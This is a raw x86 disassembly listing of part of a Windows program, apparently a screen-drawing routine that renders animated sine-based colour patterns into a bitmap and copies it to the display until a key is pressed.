  402679:	33 cc                	xor    %esp,%ecx
  40267b:	e8 44 28 00 00       	call   0x404ec4
  402680:	8b e5                	mov    %ebp,%esp
  402682:	5d                   	pop    %ebp
  402683:	c2 04 00             	ret    $0x4
  402686:	cc                   	int3
  402687:	cc                   	int3
  402688:	cc                   	int3
  402689:	cc                   	int3
  40268a:	cc                   	int3
  40268b:	cc                   	int3
  40268c:	cc                   	int3
  40268d:	cc                   	int3
  40268e:	cc                   	int3
  40268f:	cc                   	int3
  402690:	55                   	push   %ebp
  402691:	8b ec                	mov    %esp,%ebp
  402693:	83 e4 f8             	and    $0xfffffff8,%esp
  402696:	81 ec 88 00 00 00    	sub    $0x88,%esp
  40269c:	a1 08 80 40 00       	mov    0x408008,%eax
  4026a1:	33 c4                	xor    %esp,%eax
  4026a3:	89 84 24 84 00 00 00 	mov    %eax,0x84(%esp)
  4026aa:	56                   	push   %esi
  4026ab:	57                   	push   %edi
  4026ac:	6a 00                	push   $0x0
  4026ae:	ff 15 b8 60 40 00    	call   *0x4060b8
  4026b4:	8b 35 c0 60 40 00    	mov    0x4060c0,%esi
  4026ba:	6a 00                	push   $0x0
  4026bc:	89 44 24 24          	mov    %eax,0x24(%esp)
  4026c0:	ff d6                	call   *%esi
  4026c2:	6a 01                	push   $0x1
  4026c4:	8b f8                	mov    %eax,%edi
  4026c6:	ff d6                	call   *%esi
  4026c8:	6a 00                	push   $0x0
  4026ca:	8b f0                	mov    %eax,%esi
  4026cc:	c7 44 24 64 28 00 00 	movl   $0x28,0x64(%esp)
  4026d3:	00 
  4026d4:	6a 00                	push   $0x0
  4026d6:	8d 44 24 24          	lea    0x24(%esp),%eax
  4026da:	89 74 24 14          	mov    %esi,0x14(%esp)
  4026de:	50                   	push   %eax
  4026df:	6a 00                	push   $0x0
  4026e1:	8d 44 24 70          	lea    0x70(%esp),%eax
  4026e5:	89 7c 24 74          	mov    %edi,0x74(%esp)
  4026e9:	50                   	push   %eax
  4026ea:	ff 74 24 34          	push   0x34(%esp)
  4026ee:	0f 57 c0             	xorps  %xmm0,%xmm0
  4026f1:	89 b4 24 80 00 00 00 	mov    %esi,0x80(%esp)
  4026f8:	c7 84 24 84 00 00 00 	movl   $0x200001,0x84(%esp)
  4026ff:	01 00 20 00 
  402703:	c7 84 24 88 00 00 00 	movl   $0x0,0x88(%esp)
  40270a:	00 00 00 00 
  40270e:	0f 11 84 24 8c 00 00 	movups %xmm0,0x8c(%esp)
  402715:	00 
  402716:	66 0f d6 84 24 9c 00 	movq   %xmm0,0x9c(%esp)
  40271d:	00 00 
  40271f:	ff 15 04 60 40 00    	call   *0x406004
  402725:	0f 57 c0             	xorps  %xmm0,%xmm0
  402728:	89 44 24 3c          	mov    %eax,0x3c(%esp)
  40272c:	6a 1b                	push   $0x1b
  40272e:	f3 0f 11 44 24 14    	movss  %xmm0,0x14(%esp)
  402734:	ff 15 c8 60 40 00    	call   *0x4060c8
  40273a:	66 85 c0             	test   %ax,%ax
  40273d:	0f 85 04 04 00 00    	jne    0x402b47
  402743:	66 0f 6e ce          	movd   %esi,%xmm1
  402747:	66 0f 6e c7          	movd   %edi,%xmm0
  40274b:	0f 5b c0             	cvtdq2ps %xmm0,%xmm0
  40274e:	8b 35 80 61 40 00    	mov    0x406180,%esi
  402754:	c7 44 24 58 ff 00 00 	movl   $0xff,0x58(%esp)
  40275b:	00 
  40275c:	0f 5b c9             	cvtdq2ps %xmm1,%xmm1
  40275f:	f3 0f 5e c1          	divss  %xmm1,%xmm0
  402763:	f3 0f 11 44 24 4c    	movss  %xmm0,0x4c(%esp)
  402769:	0f 1f 80 00 00 00 00 	nopl   0x0(%eax)
  402770:	ff 74 24 20          	push   0x20(%esp)
  402774:	ff 15 08 60 40 00    	call   *0x406008
  40277a:	ff 74 24 3c          	push   0x3c(%esp)
  40277e:	89 44 24 60          	mov    %eax,0x60(%esp)
  402782:	50                   	push   %eax
  402783:	ff 15 00 60 40 00    	call   *0x406000
  402789:	f3 0f 10 54 24 10    	movss  0x10(%esp),%xmm2
  40278f:	33 c0                	xor    %eax,%eax
  402791:	f3 0f 58 15 90 63 40 	addss  0x406390,%xmm2
  402798:	00 
  402799:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  40279d:	89 44 24 14          	mov    %eax,0x14(%esp)
  4027a1:	f3 0f 11 54 24 10    	movss  %xmm2,0x10(%esp)
  4027a7:	85 c9                	test   %ecx,%ecx
  4027a9:	0f 8e a4 02 00 00    	jle    0x402a53
  4027af:	33 f6                	xor    %esi,%esi
  4027b1:	8d 14 bd 00 00 00 00 	lea    0x0(,%edi,4),%edx
  4027b8:	89 74 24 18          	mov    %esi,0x18(%esp)
  4027bc:	0f 1f 40 00          	nopl   0x0(%eax)
  4027c0:	c7 44 24 2c 00 00 00 	movl   $0x0,0x2c(%esp)
  4027c7:	00 
  4027c8:	85 ff                	test   %edi,%edi
  4027ca:	0f 8e 6a 02 00 00    	jle    0x402a3a
  4027d0:	66 0f 6e c0          	movd   %eax,%xmm0
  4027d4:	0f 5b c0             	cvtdq2ps %xmm0,%xmm0
  4027d7:	66 0f 6e c9          	movd   %ecx,%xmm1
  4027db:	0f 5b c9             	cvtdq2ps %xmm1,%xmm1
  4027de:	f3 0f 5e c1          	divss  %xmm1,%xmm0
  4027e2:	f3 0f 58 c0          	addss  %xmm0,%xmm0
  4027e6:	f3 0f 5c 05 c4 63 40 	subss  0x4063c4,%xmm0
  4027ed:	00 
  4027ee:	0f 28 c8             	movaps %xmm0,%xmm1
  4027f1:	f3 0f 11 44 24 24    	movss  %xmm0,0x24(%esp)
  4027f7:	f3 0f 59 0d 48 64 40 	mulss  0x406448,%xmm1
  4027fe:	00 
  4027ff:	0f 28 c2             	movaps %xmm2,%xmm0
  402802:	f3 0f 59 05 b4 63 40 	mulss  0x4063b4,%xmm0
  402809:	00 
  40280a:	f3 0f 58 c8          	addss  %xmm0,%xmm1
  40280e:	0f 5a c1             	cvtps2pd %xmm1,%xmm0
  402811:	e8 1a 35 00 00       	call   0x405d30
  402816:	f3 0f 10 4c 24 10    	movss  0x10(%esp),%xmm1
  40281c:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  402820:	f2 0f 5a c0          	cvtsd2ss %xmm0,%xmm0
  402824:	f3 0f 11 44 24 50    	movss  %xmm0,0x50(%esp)
  40282a:	0f 28 c1             	movaps %xmm1,%xmm0
  40282d:	f3 0f 59 05 cc 63 40 	mulss  0x4063cc,%xmm0
  402834:	00 
  402835:	f3 0f 11 44 24 54    	movss  %xmm0,0x54(%esp)
  40283b:	0f 28 c1             	movaps %xmm1,%xmm0
  40283e:	f3 0f 58 c1          	addss  %xmm1,%xmm0
  402842:	f3 0f 11 44 24 38    	movss  %xmm0,0x38(%esp)
  402848:	0f 1f 84 00 00 00 00 	nopl   0x0(%eax,%eax,1)
  40284f:	00 
  402850:	66 0f 6e c0          	movd   %eax,%xmm0
  402854:	0f 5b c0             	cvtdq2ps %xmm0,%xmm0
  402857:	66 0f 6e d7          	movd   %edi,%xmm2
  40285b:	0f 5b d2             	cvtdq2ps %xmm2,%xmm2
  40285e:	f3 0f 5e c2          	divss  %xmm2,%xmm0
  402862:	f3 0f 58 c0          	addss  %xmm0,%xmm0
  402866:	f3 0f 5c 05 c4 63 40 	subss  0x4063c4,%xmm0
  40286d:	00 
  40286e:	f3 0f 59 44 24 4c    	mulss  0x4c(%esp),%xmm0
  402874:	f3 0f 11 44 24 28    	movss  %xmm0,0x28(%esp)
  40287a:	f3 0f 59 05 48 64 40 	mulss  0x406448,%xmm0
  402881:	00 
  402882:	f3 0f 58 c1          	addss  %xmm1,%xmm0
  402886:	0f 5a c0             	cvtps2pd %xmm0,%xmm0
  402889:	e8 ae 34 00 00       	call   0x405d3c
  40288e:	f2 0f 5a c0          	cvtsd2ss %xmm0,%xmm0
  402892:	f3 0f 58 44 24 50    	addss  0x50(%esp),%xmm0
  402898:	f3 0f 5a c0          	cvtss2sd %xmm0,%xmm0
  40289c:	f2 0f 11 44 24 40    	movsd  %xmm0,0x40(%esp)
  4028a2:	dd 44 24 40          	fldl   0x40(%esp)
  4028a6:	e8 7f 34 00 00       	call   0x405d2a
  4028ab:	f3 0f 10 44 24 24    	movss  0x24(%esp),%xmm0
  4028b1:	f3 0f 58 44 24 28    	addss  0x28(%esp),%xmm0
  4028b7:	d9 5c 24 40          	fstps  0x40(%esp)
  4028bb:	f3 0f 59 05 44 64 40 	mulss  0x406444,%xmm0
  4028c2:	00 
  4028c3:	f3 0f 58 44 24 54    	addss  0x54(%esp),%xmm0
  4028c9:	0f 5a c0             	cvtps2pd %xmm0,%xmm0
  4028cc:	e8 6b 34 00 00       	call   0x405d3c
  4028d1:	f2 0f 5a c0          	cvtsd2ss %xmm0,%xmm0
  4028d5:	f3 0f 11 44 24 30    	movss  %xmm0,0x30(%esp)
  4028db:	f3 0f 10 44 24 28    	movss  0x28(%esp),%xmm0
  4028e1:	f3 0f 5c 44 24 24    	subss  0x24(%esp),%xmm0
  4028e7:	f3 0f 59 05 44 64 40 	mulss  0x406444,%xmm0
  4028ee:	00 
  4028ef:	0f 5a c0             	cvtps2pd %xmm0,%xmm0
  4028f2:	e8 39 34 00 00       	call   0x405d30
  4028f7:	f3 0f 10 4c 24 30    	movss  0x30(%esp),%xmm1
  4028fd:	f2 0f 5a c0          	cvtsd2ss %xmm0,%xmm0
  402901:	f3 0f 58 c8          	addss  %xmm0,%xmm1
  402905:	0f 5a c1             	cvtps2pd %xmm1,%xmm0
  402908:	f2 0f 11 44 24 30    	movsd  %xmm0,0x30(%esp)
  40290e:	dd 44 24 30          	fldl   0x30(%esp)
  402912:	e8 13 34 00 00       	call   0x405d2a
  402917:	f3 0f 10 44 24 24    	movss  0x24(%esp),%xmm0
  40291d:	f3 0f 59 44 24 28    	mulss  0x28(%esp),%xmm0
  402923:	d9 5c 24 30          	fstps  0x30(%esp)
  402927:	f3 0f 59 05 38 64 40 	mulss  0x406438,%xmm0
  40292e:	00 
  40292f:	f3 0f 58 44 24 38    	addss  0x38(%esp),%xmm0
  402935:	0f 5a c0             	cvtps2pd %xmm0,%xmm0
  402938:	e8 ff 33 00 00       	call   0x405d3c
  40293d:	f3 0f 10 6c 24 30    	movss  0x30(%esp),%xmm5
  402943:	0f 57 c9             	xorps  %xmm1,%xmm1
  402946:	f3 0f 10 25 b0 63 40 	movss  0x4063b0,%xmm4
  40294d:	00 
  40294e:	0f 28 d5             	movaps %xmm5,%xmm2
  402951:	f2 0f 5a c8          	cvtsd2ss %xmm0,%xmm1
  402955:	f3 0f 10 44 24 40    	movss  0x40(%esp),%xmm0
  40295b:	f3 0f 10 35 c0 63 40 	movss  0x4063c0,%xmm6
  402962:	00 
  402963:	f3 0f 58 d0          	addss  %xmm0,%xmm2
  402967:	f3 0f 59 cc          	mulss  %xmm4,%xmm1
  40296b:	0f 28 d8             	movaps %xmm0,%xmm3
  40296e:	f3 0f 59 1d b8 63 40 	mulss  0x4063b8,%xmm3
  402975:	00 
  402976:	f3 0f 58 cc          	addss  %xmm4,%xmm1
  40297a:	f3 0f 59 d4          	mulss  %xmm4,%xmm2
  40297e:	0f 28 e5             	movaps %xmm5,%xmm4
  402981:	f3 0f 59 25 b8 63 40 	mulss  0x4063b8,%xmm4
  402988:	00 
  402989:	0f 5a c0             	cvtps2pd %xmm0,%xmm0
  40298c:	f3 0f 59 d9          	mulss  %xmm1,%xmm3
  402990:	f3 0f 59 d1          	mulss  %xmm1,%xmm2
  402994:	f3 0f 59 e1          	mulss  %xmm1,%xmm4
  402998:	f2 0f 10 0d 80 64 40 	movsd  0x406480,%xmm1
  40299f:	00 
  4029a0:	0f 54 c1             	andps  %xmm1,%xmm0
  4029a3:	66 0f 5a c0          	cvtpd2ps %xmm0,%xmm0
  4029a7:	0f 2f c6             	comiss %xmm6,%xmm0
  4029aa:	76 27                	jbe    0x4029d3
  4029ac:	0f 5a c5             	cvtps2pd %xmm5,%xmm0
  4029af:	0f 54 c1             	andps  %xmm1,%xmm0
  4029b2:	66 0f 5a c0          	cvtpd2ps %xmm0,%xmm0
  4029b6:	0f 2f c6             	comiss %xmm6,%xmm0
  4029b9:	76 18                	jbe    0x4029d3
  4029bb:	f3 0f 10 1d c4 63 40 	movss  0x4063c4,%xmm3
  4029c2:	00 
  4029c3:	f3 0f 10 15 a4 63 40 	movss  0x4063a4,%xmm2
  4029ca:	00 
  4029cb:	f3 0f 10 25 bc 63 40 	movss  0x4063bc,%xmm4
  4029d2:	00 
  4029d3:	f3 0f 10 05 60 64 40 	movss  0x406460,%xmm0
  4029da:	00 
  4029db:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  4029df:	f3 0f 59 d8          	mulss  %xmm0,%xmm3
  4029e3:	f3 0f 10 4c 24 10    	movss  0x10(%esp),%xmm1
  4029e9:	f3 0f 59 d0          	mulss  %xmm0,%xmm2
  4029ed:	f3 0f 2c cb          	cvttss2si %xmm3,%ecx
  4029f1:	f3 0f 59 e0          	mulss  %xmm0,%xmm4
  4029f5:	88 4c 06 02          	mov    %cl,0x2(%esi,%eax,1)
  4029f9:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  4029fd:	f3 0f 2c ca          	cvttss2si %xmm2,%ecx
  402a01:	88 4c 06 01          	mov    %cl,0x1(%esi,%eax,1)
  402a05:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  402a09:	f3 0f 2c cc          	cvttss2si %xmm4,%ecx
  402a0d:	88 0c 06             	mov    %cl,(%esi,%eax,1)
  402a10:	83 c6 04             	add    $0x4,%esi
  402a13:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  402a17:	40                   	inc    %eax
  402a18:	89 44 24 2c          	mov    %eax,0x2c(%esp)
  402a1c:	3b c7                	cmp    %edi,%eax
  402a1e:	0f 8c 2c fe ff ff    	jl     0x402850
  402a24:	8b 44 24 14          	mov    0x14(%esp),%eax
  402a28:	8d 14 bd 00 00 00 00 	lea    0x0(,%edi,4),%edx
  402a2f:	8b 74 24 18          	mov    0x18(%esp),%esi
  402a33:	0f 28 d1             	movaps %xmm1,%xmm2
  402a36:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  402a3a:	40                   	inc    %eax
  402a3b:	03 f2                	add    %edx,%esi
  402a3d:	89 44 24 14          	mov    %eax,0x14(%esp)
  402a41:	89 74 24 18          	mov    %esi,0x18(%esp)
  402a45:	3b c1                	cmp    %ecx,%eax
  402a47:	0f 8c 73 fd ff ff    	jl     0x4027c0
  402a4d:	8b 35 80 61 40 00    	mov    0x406180,%esi
  402a53:	ff d6                	call   *%esi
  402a55:	99                   	cltd
  402a56:	b9 64 00 00 00       	mov    $0x64,%ecx
  402a5b:	f7 f9                	idiv   %ecx
  402a5d:	83 fa 03             	cmp    $0x3,%edx
  402a60:	0f 8d 9a 00 00 00    	jge    0x402b00
  402a66:	ff d6                	call   *%esi
  402a68:	99                   	cltd
  402a69:	f7 ff                	idiv   %edi
  402a6b:	89 54 24 40          	mov    %edx,0x40(%esp)
  402a6f:	ff d6                	call   *%esi
  402a71:	99                   	cltd
  402a72:	33 c9                	xor    %ecx,%ecx
  402a74:	f7 7c 24 0c          	idivl  0xc(%esp)
  402a78:	8d 42 fb             	lea    -0x5(%edx),%eax
  402a7b:	85 c0                	test   %eax,%eax
  402a7d:	8d 72 05             	lea    0x5(%edx),%esi
  402a80:	89 74 24 30          	mov    %esi,0x30(%esp)
  402a84:	0f 49 c8             	cmovns %eax,%ecx
  402a87:	8b d1                	mov    %ecx,%edx
  402a89:	0f af d7             	imul   %edi,%edx
  402a8c:	39 74 24 0c          	cmp    %esi,0xc(%esp)
  402a90:	8b c6                	mov    %esi,%eax
  402a92:	89 54 24 14          	mov    %edx,0x14(%esp)
  402a96:	0f 4c 44 24 0c       	cmovl  0xc(%esp),%eax
  402a9b:	89 4c 24 18          	mov    %ecx,0x18(%esp)
  402a9f:	3b c8                	cmp    %eax,%ecx
  402aa1:	7d 5d                	jge    0x402b00
  402aa3:	8b 4c 24 40          	mov    0x40(%esp),%ecx
  402aa7:	33 f6                	xor    %esi,%esi
  402aa9:	8d 41 fb             	lea    -0x5(%ecx),%eax
  402aac:	85 c0                	test   %eax,%eax
  402aae:	0f 49 f0             	cmovns %eax,%esi
  402ab1:	83 c1 05             	add    $0x5,%ecx
  402ab4:	03 d6                	add    %esi,%edx
  402ab6:	89 4c 24 38          	mov    %ecx,0x38(%esp)
  402aba:	c1 e2 02             	shl    $0x2,%edx
  402abd:	0f 1f 00             	nopl   (%eax)
  402ac0:	3b f9                	cmp    %ecx,%edi
  402ac2:	8b c1                	mov    %ecx,%eax
  402ac4:	0f 4c c7             	cmovl  %edi,%eax
  402ac7:	3b f0                	cmp    %eax,%esi
  402ac9:	7d 24                	jge    0x402aef
  402acb:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  402acf:	0f b6 44 0a 01       	movzbl 0x1(%edx,%ecx,1),%eax
  402ad4:	83 c0 64             	add    $0x64,%eax
  402ad7:	3d ff 00 00 00       	cmp    $0xff,%eax
  402adc:	0f 47 44 24 58       	cmova  0x58(%esp),%eax
  402ae1:	46                   	inc    %esi
  402ae2:	88 44 0a 01          	mov    %al,0x1(%edx,%ecx,1)
  402ae6:	83 c2 04             	add    $0x4,%edx
  402ae9:	8b 4c 24 38          	mov    0x38(%esp),%ecx
  402aed:	eb d1                	jmp    0x402ac0
  402aef:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  402af3:	8b 54 24 14          	mov    0x14(%esp),%edx
  402af7:	41                   	inc    %ecx
  402af8:	8b 74 24 30          	mov    0x30(%esp),%esi
  402afc:	03 d7                	add    %edi,%edx
  402afe:	eb 8c                	jmp    0x402a8c
  402b00:	8b 74 24 5c          	mov    0x5c(%esp),%esi
  402b04:	68 20 00 cc 00       	push   $0xcc0020
  402b09:	6a 00                	push   $0x0
  402b0b:	6a 00                	push   $0x0
  402b0d:	56                   	push   %esi
  402b0e:	ff 74 24 1c          	push   0x1c(%esp)
  402b12:	57                   	push   %edi
  402b13:	6a 00                	push   $0x0
  402b15:	6a 00                	push   $0x0
  402b17:	ff 74 24 40          	push   0x40(%esp)
  402b1b:	ff 15 20 60 40 00    	call   *0x406020
  402b21:	56                   	push   %esi
  402b22:	ff 15 10 60 40 00    	call   *0x406010
  402b28:	6a 10                	push   $0x10
  402b2a:	ff 15 64 60 40 00    	call   *0x406064
  402b30:	6a 1b                	push   $0x1b
  402b32:	ff 15 c8 60 40 00    	call   *0x4060c8
  402b38:	8b 35 80 61 40 00    	mov    0x406180,%esi
  402b3e:	66 85 c0             	test   %ax,%ax
  402b41:	0f 84 29 fc ff ff    	je     0x402770
  402b47:	ff 74 24 3c          	push   0x3c(%esp)
  402b4b:	ff 15 18 60 40 00    	call   *0x406018
  402b51:	ff 74 24 20          	push   0x20(%esp)
  402b55:	6a 00                	push   $0x0
  402b57:	ff 15 b0 60 40 00    	call   *0x4060b0
  402b5d:	8b 8c 24 8c 00 00 00 	mov    0x8c(%esp),%ecx
  402b64:	33 c0                	xor    %eax,%eax
  402b66:	5f                   	pop    %edi
  402b67:	5e                   	pop    %esi
  402b68:	33 cc                	xor    %esp,%ecx
  402b6a:	e8 55 23 00 00       	call   0x404ec4
  402b6f:	8b e5                	mov    %ebp,%esp
  402b71:	5d                   	pop    %ebp
  402b72:	c2 04 00             	ret    $0x4
  402b75:	cc                   	int3
  402b76:	cc                   	int3
  402b77:	cc                   	int3
  402b78:	cc                   	int3
  402b79:	cc                   	int3
  402b7a:	cc                   	int3
  402b7b:	cc                   	int3
  402b7c:	cc                   	int3
  402b7d:	cc                   	int3
  402b7e:	cc                   	int3
  402b7f:	cc                   	int3
  402b80:	55                   	push   %ebp
  402b81:	8b ec                	mov    %esp,%ebp
  402b83:	83 e4 f8             	and    $0xfffffff8,%esp
  402b86:	81 ec 88 00 00 00    	sub    $0x88,%esp
  402b8c:	a1 08 80 40 00       	mov    0x408008,%eax
  402b91:	33 c4                	xor    %esp,%eax
  402b93:	89 84 24 84 00 00 00 	mov    %eax,0x84(%esp)
  402b9a:	56                   	push   %esi
  402b9b:	57                   	push   %edi
  402b9c:	6a 00                	push   $0x0
  402b9e:	ff 15 b8 60 40 00    	call   *0x4060b8
  402ba4:	8b 35 c0 60 40 00    	mov    0x4060c0,%esi
  402baa:	6a 00                	push   $0x0
  402bac:	89 44 24 18          	mov    %eax,0x18(%esp)
  402bb0:	ff d6                	call   *%esi
  402bb2:	8b f8                	mov    %eax,%edi
  402bb4:	6a 01                	push   $0x1
  402bb6:	89 7c 24 24          	mov    %edi,0x24(%esp)
  402bba:	ff d6                	call   *%esi
  402bbc:	6a 00                	push   $0x0
  402bbe:	8b f0                	mov    %eax,%esi
  402bc0:	c7 44 24 64 28 00 00 	movl   $0x28,0x64(%esp)
  402bc7:	00 
  402bc8:	6a 00                	push   $0x0
  402bca:	8d 44 24 20          	lea    0x20(%esp),%eax
  402bce:	89 74 24 64          	mov    %esi,0x64(%esp)
  402bd2:	50                   	push   %eax
  402bd3:	6a 00                	push   $0x0
  402bd5:	8d 44 24 70          	lea    0x70(%esp),%eax
  402bd9:	89 7c 24 74          	mov    %edi,0x74(%esp)
  402bdd:	50                   	push   %eax
  402bde:	ff 74 24 28          	push   0x28(%esp)
  402be2:	0f 57 c0             	xorps  %xmm0,%xmm0
  402be5:	89 b4 24 80 00 00 00 	mov    %esi,0x80(%esp)
  402bec:	c7 84 24 84 00 00 00 	movl   $0x200001,0x84(%esp)
  402bf3:	01 00 20 00 
  402bf7:	c7 84 24 88 00 00 00 	movl   $0x0,0x88(%esp)
  402bfe:	00 00 00 00 
  402c02:	0f 11 84 24 8c 00 00 	movups %xmm0,0x8c(%esp)
  402c09:	00 
  402c0a:	66 0f d6 84 24 9c 00 	movq   %xmm0,0x9c(%esp)
  402c11:	00 00 
  402c13:	ff 15 04 60 40 00    	call   *0x406004
  402c19:	0f 57 c9             	xorps  %xmm1,%xmm1
  402c1c:	89 44 24 38          	mov    %eax,0x38(%esp)
  402c20:	6a 1b                	push   $0x1b
  402c22:	f3 0f 11 4c 24 14    	movss  %xmm1,0x14(%esp)
  402c28:	ff 15 c8 60 40 00    	call   *0x4060c8
  402c2e:	66 85 c0             	test   %ax,%ax
  402c31:	0f 85 f4 04 00 00    	jne    0x40312b
  402c37:	66 0f 6e c7          	movd   %edi,%xmm0
  402c3b:	66 0f 6e ce          	movd   %esi,%xmm1
  402c3f:	0f 5b c0             	cvtdq2ps %xmm0,%xmm0
  402c42:	0f 5b c9             	cvtdq2ps %xmm1,%xmm1
  402c45:	f3 0f 5e c1          	divss  %xmm1,%xmm0
  402c49:	f3 0f 11 44 24 3c    	movss  %xmm0,0x3c(%esp)
  402c4f:	90                   	nop
  402c50:	ff 74 24 14          	push   0x14(%esp)
  402c54:	ff 15 08 60 40 00    	call   *0x406008
  402c5a:	ff 74 24 38          	push   0x38(%esp)
  402c5e:	89 44 24 28          	mov    %eax,0x28(%esp)
  402c62:	50                   	push   %eax
  402c63:	ff 15 00 60 40 00    	call   *0x406000
  402c69:	f3 0f 10 44 24 10    	movss  0x10(%esp),%xmm0
  402c6f:	f3 0f 58 05 94 63 40 	addss  0x406394,%xmm0
  402c76:	00 
  402c77:	f3 0f 11 44 24 10    	movss  %xmm0,0x10(%esp)
  402c7d:	f3 0f 59 05 a4 63 40 	mulss  0x4063a4,%xmm0
  402c84:	00 
  402c85:	0f 5a c0             	cvtps2pd %xmm0,%xmm0
  402c88:	e8 af 30 00 00       	call   0x405d3c
  402c8d:	f2 0f 5a c0          	cvtsd2ss %xmm0,%xmm0
  402c91:	33 c0                	xor    %eax,%eax
  402c93:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  402c97:	f3 0f 59 05 b0 63 40 	mulss  0x4063b0,%xmm0
  402c9e:	00 
  402c9f:	f3 0f 58 05 28 64 40 	addss  0x406428,%xmm0
  402ca6:	00 
  402ca7:	f3 0f 11 44 24 48    	movss  %xmm0,0x48(%esp)
  402cad:	85 f6                	test   %esi,%esi
  402caf:	0f 8e d3 03 00 00    	jle    0x403088
  402cb5:	8b 4c 24 20          	mov    0x20(%esp),%ecx
  402cb9:	33 d2                	xor    %edx,%edx
  402cbb:	89 54 24 34          	mov    %edx,0x34(%esp)
  402cbf:	90                   	nop
  402cc0:	33 ff                	xor    %edi,%edi
  402cc2:	85 c9                	test   %ecx,%ecx
  402cc4:	0f 8e a0 03 00 00    	jle    0x40306a
  402cca:	66 0f 6e c0          	movd   %eax,%xmm0
  402cce:	0f 5b c8             	cvtdq2ps %xmm0,%xmm1
  402cd1:	66 0f 6e c6          	movd   %esi,%xmm0
  402cd5:	8b f2                	mov    %edx,%esi
  402cd7:	0f 5b c0             	cvtdq2ps %xmm0,%xmm0
  402cda:	f3 0f 5e c8          	divss  %xmm0,%xmm1
  402cde:	f3 0f 10 05 c4 63 40 	movss  0x4063c4,%xmm0
  402ce5:	00 
  402ce6:	f3 0f 58 c9          	addss  %xmm1,%xmm1
  402cea:	f3 0f 5c c8          	subss  %xmm0,%xmm1
  402cee:	0f 28 d1             	movaps %xmm1,%xmm2
  402cf1:	f3 0f 11 4c 24 40    	movss  %xmm1,0x40(%esp)
  402cf7:	f3 0f 59 d1          	mulss  %xmm1,%xmm2
  402cfb:	f3 0f 10 4c 24 10    	movss  0x10(%esp),%xmm1
  402d01:	0f 28 d9             	movaps %xmm1,%xmm3
  402d04:	f3 0f 59 0d 2c 64 40 	mulss  0x40642c,%xmm1
  402d0b:	00 
  402d0c:	f3 0f 59 1d bc 63 40 	mulss  0x4063bc,%xmm3
  402d13:	00 
  402d14:	f3 0f 11 54 24 58    	movss  %xmm2,0x58(%esp)
  402d1a:	f3 0f 11 4c 24 4c    	movss  %xmm1,0x4c(%esp)
  402d20:	f3 0f 11 5c 24 44    	movss  %xmm3,0x44(%esp)
  402d26:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%eax,%eax,1)
  402d2d:	00 00 00 
  402d30:	66 0f 6e cf          	movd   %edi,%xmm1
  402d34:	0f 5b c9             	cvtdq2ps %xmm1,%xmm1
  402d37:	66 0f 6e d9          	movd   %ecx,%xmm3
  402d3b:	0f 5b db             	cvtdq2ps %xmm3,%xmm3
  402d3e:	f3 0f 5e cb          	divss  %xmm3,%xmm1
  402d42:	f3 0f 58 c9          	addss  %xmm1,%xmm1
  402d46:	f3 0f 5c c8          	subss  %xmm0,%xmm1
  402d4a:	f3 0f 59 4c 24 3c    	mulss  0x3c(%esp),%xmm1
  402d50:	0f 28 c1             	movaps %xmm1,%xmm0
  402d53:	f3 0f 11 4c 24 0c    	movss  %xmm1,0xc(%esp)
  402d59:	f3 0f 59 c1          	mulss  %xmm1,%xmm0
  402d5d:	f3 0f 58 c2          	addss  %xmm2,%xmm0
  402d61:	0f 5a c0             	cvtps2pd %xmm0,%xmm0
  402d64:	e8 d9 2f 00 00       	call   0x405d42
  402d69:	f2 0f 5a c0          	cvtsd2ss %xmm0,%xmm0
  402d6d:	f3 0f 11 44 24 08    	movss  %xmm0,0x8(%esp)
  402d73:	f3 0f 10 44 24 40    	movss  0x40(%esp),%xmm0
  402d79:	0f 5a c0             	cvtps2pd %xmm0,%xmm0
  402d7c:	f2 0f 11 44 24 28    	movsd  %xmm0,0x28(%esp)
  402d82:	f3 0f 10 44 24 0c    	movss  0xc(%esp),%xmm0
  402d88:	dd 44 24 28          	fldl   0x28(%esp)
  402d8c:	0f 5a c0             	cvtps2pd %xmm0,%xmm0
  402d8f:	f2 0f 11 44 24 28    	movsd  %xmm0,0x28(%esp)
  402d95:	dd 44 24 28          	fldl   0x28(%esp)
  402d99:	e8 80 2f 00 00       	call   0x405d1e
  402d9e:	f3 0f 10 44 24 08    	movss  0x8(%esp),%xmm0
  402da4:	f3 0f 59 44 24 48    	mulss  0x48(%esp),%xmm0
  402daa:	dd 5c 24 28          	fstpl  0x28(%esp)
  402dae:	f2 0f 10 4c 24 28    	movsd  0x28(%esp),%xmm1
  402db4:	66 0f 5a c9          	cvtpd2ps %xmm1,%xmm1
  402db8:	f3 0f 58 4c 24 44    	addss  0x44(%esp),%xmm1
  402dbe:	f3 0f 5c c8          	subss  %xmm0,%xmm1
  402dc2:	f3 0f 10 44 24 08    	movss  0x8(%esp),%xmm0
  402dc8:	f3 0f 59 05 4c 64 40 	mulss  0x40644c,%xmm0
  402dcf:	00 
  402dd0:	f3 0f 59 0d 40 64 40 	mulss  0x406440,%xmm1
  402dd7:	00 
  402dd8:	f3 0f 58 c8          	addss  %xmm0,%xmm1
  402ddc:	f3 0f 5c 4c 24 4c    	subss  0x4c(%esp),%xmm1
  402de2:	0f 5a c1             	cvtps2pd %xmm1,%xmm0
  402de5:	e8 52 2f 00 00       	call   0x405d3c
  402dea:	f3 0f 10 0d bc 63 40 	movss  0x4063bc,%xmm1
  402df1:	00 
  402df2:	f3 0f 5c 4c 24 08    	subss  0x8(%esp),%xmm1
  402df8:	f2 0f 5a c0          	cvtsd2ss %xmm0,%xmm0
  402dfc:	f3 0f 11 44 24 28    	movss  %xmm0,0x28(%esp)
  402e02:	0f 57 c0             	xorps  %xmm0,%xmm0
  402e05:	f3 0f 5f c1          	maxss  %xmm1,%xmm0
  402e09:	f2 0f 10 0d 10 64 40 	movsd  0x406410,%xmm1
  402e10:	00 
  402e11:	0f 5a c0             	cvtps2pd %xmm0,%xmm0
  402e14:	e8 1d 2f 00 00       	call   0x405d36
  402e19:	f3 0f 10 54 24 08    	movss  0x8(%esp),%xmm2
  402e1f:	0f 57 c9             	xorps  %xmm1,%xmm1
  402e22:	0f 2f 15 a8 63 40 00 	comiss 0x4063a8,%xmm2
